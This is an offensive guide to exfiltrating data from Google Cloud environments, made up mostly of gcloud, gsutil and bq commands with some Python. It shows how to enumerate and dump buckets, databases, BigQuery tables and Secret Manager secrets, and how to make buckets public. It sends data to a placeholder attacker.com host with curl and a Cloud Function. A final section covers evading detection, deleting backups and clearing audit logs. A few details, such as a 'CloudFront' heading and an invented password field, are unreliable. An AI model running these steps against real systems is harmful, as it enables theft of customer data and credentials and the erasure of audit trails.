# GCP Data Exfiltration

Techniques for identifying and exfiltrating data from Google Cloud Platform environments.

## Data Discovery

### Find Sensitive Cloud Storage Buckets

```bash
# List all accessible buckets
gsutil ls

# For each bucket, check what's inside
for bucket in $(gsutil ls); do
  echo "=== $bucket ==="
  gsutil ls -r $bucket | head -20
done

# Search for sensitive patterns
gsutil ls -r gs://** | grep -i "backup\|export\|database\|customer\|archive\|sql\|dump"

# Check bucket metadata and permissions
for bucket in $(gsutil ls); do
  echo "=== Bucket: $bucket ==="
  gsutil versioning get $bucket
  gsutil lifecycle get $bucket
done

# Large buckets worth investigating
gsutil du -s gs://bucket-name  # Size of bucket
gsutil du -s gs://**  # All buckets
```

### Find Cloud SQL Databases

```bash
# Enumerate all Cloud SQL instances
gcloud sql instances list --format="json"

# Get details on each instance
gcloud sql instances describe {instance} --format="json"

# Check databases in instance
gcloud sql databases list --instance={instance}

# Get instance IP and credentials location
gcloud sql instances describe {instance} \
  --format="json" | jq '{name, ipAddresses, state, databaseVersion}'

# Check for public accessibility
gcloud sql instances describe {instance} \
  --format="value(settings.ipConfiguration.requireSsl, settings.ipConfiguration.authorizedNetworks)"
```

### Discover BigQuery Datasets

```bash
# List all datasets
bq ls --project_id={projectId}

# Check dataset permissions
bq show {dataset}

# Look for datasets with "customer", "data", "analytics", "reports", etc.
bq ls --project_id={projectId} | grep -i "customer\|analytics\|reports\|data"

# Get table information
bq ls {dataset}

# Estimate data size
bq ls -n 10000 {dataset}.{table}
bq show -j {dataset}.{table}

# Check table schema to understand data content
bq show --schema {dataset}.{table}

# Look for sensitive columns
bq show --schema {dataset}.{table} | grep -i "email\|phone\|ssn\|credit\|password\|key"
```

### Enumerate Pub/Sub Topics

```bash
# List all topics
gcloud pubsub topics list

# Check subscriptions
gcloud pubsub topics list-subscriptions {topic}

# Pull messages to see what data is flowing
gcloud pubsub subscriptions create temp-sub --topic={topic}
gcloud pubsub subscriptions pull temp-sub --auto-ack --limit=100

# Messages often contain:
# - Customer records
# - Transaction data
# - API responses
# - Sensitive events

# Create persistent subscription for exfil
gcloud pubsub subscriptions create attacker-sub --topic={sensitive-topic}
gcloud pubsub subscriptions pull attacker-sub --auto-ack --limit=10000 > messages.json
```

### Find Cloud Secrets

```bash
# List all secrets in Secret Manager
gcloud secrets list

# Get secret versions
gcloud secrets list --format="json" | jq '.[] | {name, labels}'

# Access secrets
gcloud secrets versions access latest --secret={secret-name}

# Common secrets:
# - Database passwords
# - API keys
# - Encryption keys
# - OAuth tokens
# - SSL certificates

# Export all accessible secrets
for secret in $(gcloud secrets list --format="value(name)"); do
  echo "=== Secret: $secret ==="
  gcloud secrets versions access latest --secret=$secret 2>/dev/null || echo "Access denied"
done > all-secrets.txt
```

## Cloud SQL Exfiltration

### Direct Database Connection

```bash
# Get Cloud SQL instance IP and credentials
INSTANCE_IP=$(gcloud sql instances describe {instance} \
  --format="value(privateIpAddress)" || \
  gcloud sql instances describe {instance} --format="value(ipAddresses[0].ipAddress)")

MASTER_USER=$(gcloud sql instances describe {instance} \
  --format="value(settings.backupConfiguration.masterUserPassword)" || echo "root")

# Connect to PostgreSQL
PGPASSWORD={password} psql -h $INSTANCE_IP -U postgres -d {database} \
  -c "SELECT * FROM sensitive_table;" > data.csv

# Connect to MySQL
mysql -h $INSTANCE_IP -u root -p{password} {database} \
  -e "SELECT * FROM customers; SELECT * FROM orders;" > database-dump.sql

# Connect to SQL Server
sqlcmd -S $INSTANCE_IP -U {user} -P {password} -d {database} \
  -Q "SELECT * FROM dbo.sensitive_data" > data.txt

# Export large datasets
gzip -c database-dump.sql | dd of=compressed-dump.sql.gz

# For very large datasets, export to Cloud Storage first (faster)
mysqldump -h $INSTANCE_IP -u root -p{password} {database} --quick --no-create-info > /tmp/dump.sql
gzip /tmp/dump.sql
gsutil cp /tmp/dump.sql.gz gs://exfil-bucket/
```

### Cloud SQL Backup Exfiltration

```bash
# Create backup (if you have cloudsql.instances.update)
gcloud sql backups create \
  --instance={instance} \
  --description="Maintenance backup"

# List backups
gcloud sql backups list --instance={instance}

# Export backup to Cloud Storage
gcloud sql export sql {instance} gs://exfil-bucket/backup-export.sql

# Or export as CSV for specific table
gcloud sql export csv {instance} gs://exfil-bucket/customers.csv \
  --database={database} \
  --offload \
  --query='SELECT * FROM customers'

# Download from Cloud Storage
gsutil cp gs://exfil-bucket/customers.csv ./

# Delete backup if attempting to cover tracks
gcloud sql backups delete {backup-id} --instance={instance}
```

### Restore to Attacker Project

```bash
# If you have permissions, restore backup to attacker account
gcloud sql backups list --instance={instance} --format="json" | \
  jq '.[] | .name' | head -1

# Restore snapshot to new instance (if available)
gcloud sql instances clone {source-instance} attacker-db \
  --region={region}

# Or restore from backup in attacker project
gcloud sql instances import {instance} gs://attacker-backup-bucket/backup.sql \
  --database={database}

# Access the restored data
mysql -h attacker-db-ip -u root -p{password} {database}
```

## BigQuery Data Exfiltration

### Query and Export

```bash
# Query sensitive table
bq query --nouse_legacy_sql --format=csv \
  'SELECT * FROM `{project}.{dataset}.{table}`' > data.csv

# Or use SQL directly
bq query --nouse_legacy_sql \
  'SELECT customer_id, email, phone, ssn FROM `{project}.sensitive.customers` \
   WHERE created_date > "2023-01-01"'

# Export entire table to Cloud Storage
bq extract {dataset}.{table} gs://exfil-bucket/table-export.csv

# Export with compression
bq extract \
  --destination_format CSV \
  --compression GZIP \
  {dataset}.{table} \
  gs://exfil-bucket/table-export.csv.gz

# Parallel export for large tables (splits into multiple files)
bq extract --destination_format PARQUET {dataset}.{table} \
  gs://exfil-bucket/table-export-*.parquet
```

### Create Exfiltration Dataset

```bash
# Create dataset for staging data exfiltration
bq mk --dataset_id=staging {projectId}:staging

# Copy sensitive tables there
bq cp {projectId}:{dataset}.{table} {projectId}:staging.{table}

# Export entire dataset
bq extract {dataset}.* gs://exfil-bucket/dataset-export-*.csv

# Or use scheduled query to continuously copy data
bq mk --transfer_config \
  --location=us \
  --display_name="Data Export" \
  --target_dataset_id=staging \
  --data_source_id=scheduled_query \
  --params='{"query":"CREATE OR REPLACE TABLE staging.stolen_data AS SELECT * FROM {dataset}.sensitive_table","destination_table_name_template":"stolen_{run_date}"}'
```

### BigQuery ML Abuse

```bash
# BigQuery ML can export model predictions
# Use to extract data indirectly

bq mk --model {dataset}.data_exfil \
  --model_type=linear_reg

# Create predictions on all data
bq query --nouse_legacy_sql \
  'CREATE OR REPLACE TABLE `{project}.{dataset}.predictions` AS
   SELECT * FROM ML.PREDICT(
     MODEL `{project}.{dataset}.data_exfil`,
     (SELECT * FROM `{project}.{dataset}.customers`)
   )'

# Export predictions
bq extract {dataset}.predictions gs://exfil-bucket/predictions.csv
```

## Cloud Storage Bulk Export

### Parallel Download

```bash
# Download entire bucket
gsutil -m cp -r gs://sensitive-bucket /local/path/

# Or stream and compress
gsutil -m cp gs://bucket/** - | tar czf data.tar.gz

# Parallel syncing for large buckets
gsutil -m -j 8 cp gs://bucket/* ./data/

# Resume interrupted transfers
gsutil -m cp -r -C gs://bucket/ ./data/

# Check transfer size before starting
gsutil du -s gs://bucket/

# For very large data, use Cloud Transfer Service
# Creates transfer job that can be scheduled
```

### Selective Extraction

```bash
# Download only certain file types
gsutil -m cp 'gs://bucket/**.csv' ./csv-files/
gsutil -m cp 'gs://bucket/**/backup/**' ./backups/

# Download files matching pattern
gsutil cp 'gs://bucket/2024/**' ./recent-data/

# Download with size limits
gsutil ls -L gs://bucket/** | \
  awk '$1 > 100M {print $NF}' | \
  while read file; do gsutil cp "$file" ./large-files/; done
```

### CloudFront-based Exfil

```bash
# Create CloudFront distribution for faster downloads
# Or configure bucket for public access for external download

gsutil iam get gs://exfil-bucket > policy.json

# Policy allowing everyone to read
cat > bucket-policy.json << 'EOF'
{
  "bindings": [{
    "role": "roles/storage.objectViewer",
    "members": ["allUsers"]
  }]
}
EOF

gsutil iam set bucket-policy.json gs://exfil-bucket

# Now public: https://storage.googleapis.com/{bucket}/{object}
```

## Firestore & Datastore Exfiltration

### Export Firestore Database

```bash
# Check accessible Firestore databases
gcloud firestore databases list

# Export to Cloud Storage (if you have datastore.databases.export)
gcloud firestore export gs://exfil-bucket/firestore-export

# Check export status
gcloud firestore operations list

# Download exported data
gsutil cp -r gs://exfil-bucket/firestore-export/ ./

# Exported data is in JSON format
# Contains all collections and documents
```

### Query Firestore Directly

```bash
# If you have Firestore client library access
# Query from application or Cloud Function

from firebase_admin import firestore

db = firestore.client()

# Get all documents from collection
docs = db.collection('customers').stream()
for doc in docs:
    print(f'{doc.id}: {doc.to_dict()}')

# Export to local file
with open('firestore-dump.json', 'w') as f:
    for doc in db.collection('customers').stream():
        f.write(json.dumps({doc.id: doc.to_dict()}) + '\n')
```

## Spanner & Datastore

### Cloud Spanner Export

```bash
# Export Spanner database
gcloud spanner databases export {database} \
  gs://exfil-bucket/spanner-export \
  --instance={instance}

# Or use Dataflow export pipeline
# Dataflow job exports data to Cloud Storage

gcloud dataflow jobs create {jobName} \
  --gcs-location=gs://dataflow-templates-{region}/latest/ \
  --parameters=instanceId={instance},databaseId={database},outputPath=gs://exfil-bucket/
```

### Direct Spanner Querying

```bash
# Query Spanner database
gcloud spanner databases execute-sql {database} \
  --instance={instance} \
  --sql='SELECT * FROM customers' > customers.txt

# Export via application
# Using Spanner client library in Cloud Function/App Engine

from google.cloud import spanner

client = spanner.Client(project={projectId})
instance = client.instance({instance})
database = instance.database({database})

with database.snapshot() as snapshot:
    results = snapshot.execute_sql('SELECT * FROM sensitive_table')
    for row in results:
        print(row)
```

## Logs & Monitoring Data

### Export Cloud Logging

```bash
# Cloud Logs can contain sensitive information
gcloud logging read "resource.type=gce_instance" --limit=50000 --format=json > logs.json

# Filter specific logs
gcloud logging read "severity=ERROR AND resource.type=cloudsql_database" \
  --limit=10000 --format=json > sql-errors.json

# Export logs to Cloud Storage
gcloud logging sinks create log-export \
  gs://exfil-bucket/logs \
  --log-filter='resource.type="gce_instance"' \
  --project={projectId}

# Or create export task
gcloud logging copy \
  --log-filter='*' \
  gs://exfil-bucket/logs

# Download exported logs
gsutil -m cp -r gs://exfil-bucket/logs ./
```

### Cloud Monitoring Metrics

```bash
# Metrics often contain sensitive data
gcloud monitoring time-series list \
  --filter='metric.type="compute.googleapis.com/instance/cpu/utilization"' \
  --format=json > metrics.json

# Export metrics to Cloud Storage
gcloud monitoring metrics-descriptors list --format=json > metric-definitions.json
```

## Exfiltration Infrastructure

### Create Attacker-Controlled Cloud Storage

```bash
# Create bucket in attacker's account
gsutil mb -l us-central1 gs://exfil-{random}/

# Allow victim's service account to write
gsutil iam ch serviceAccount:{victimSA}@{victimProject}.iam.gserviceaccount.com:roles/storage.objectCreator gs://exfil-{random}/

# Victim pushes data there
gsutil cp sensitive-data.tar.gz gs://exfil-{random}/
```

### GCS to External Endpoint

```bash
# Download and pipe to external server
gsutil cp gs://data-bucket/sensitive.zip - | \
  curl -X POST --data-binary @- http://attacker.com/exfil

# Or setup periodic backup to external location
# Via Cloud Function
cat > exfil.py << 'EOF'
from google.cloud import storage
import requests

def exfil_to_external(request):
    client = storage.Client()
    bucket = client.bucket('{sensitive-bucket}')
    
    for blob in bucket.list_blobs():
        data = blob.download_as_bytes()
        requests.post(
            'http://attacker.com/receive',
            files={'file': (blob.name, data)}
        )
    return 'Done'
EOF
```

## Speed & Bandwidth Optimization

```bash
# Estimate transfer time for large exports
# GCP to external: ~50-100 Mbps typical
# Within GCP: ~1-5 Gbps (if VM in same region)

# Compress before transfer (10-50x for structured data)
bq extract --destination_format CSV {dataset}.{table} - | \
  gzip > data.csv.gz

# Parallel transfers for larger speed
gsutil -m -j 32 cp gs://bucket/* ./

# Use regional buckets to avoid egress charges tracking
gsutil mb -l {same-region-as-data} gs://exfil-staging/

# Transfer data within region first, then one egress
```

## Detection Evasion

```bash
# Spread exfiltration over time
# Smaller exports less likely to trigger alerts

for table in $(bq ls {dataset} | awk '{print $1}'); do
  bq extract --destination_format CSV {dataset}.$table gs://exfil-bucket/$table.csv
  sleep 3600  # Wait 1 hour between exports
done

# Use service accounts unlikely to be monitored
# Backup/maintenance accounts, dev accounts

# Export during business hours
# Looks like normal activity

# Delete export jobs from history (if permissions allow)
bq ls -j -p {projectId}  # List jobs
bq cancel {jobId}  # Cancel/delete

# Clear audit logs if possible
gcloud logging delete firestore-activity --project={projectId}
```
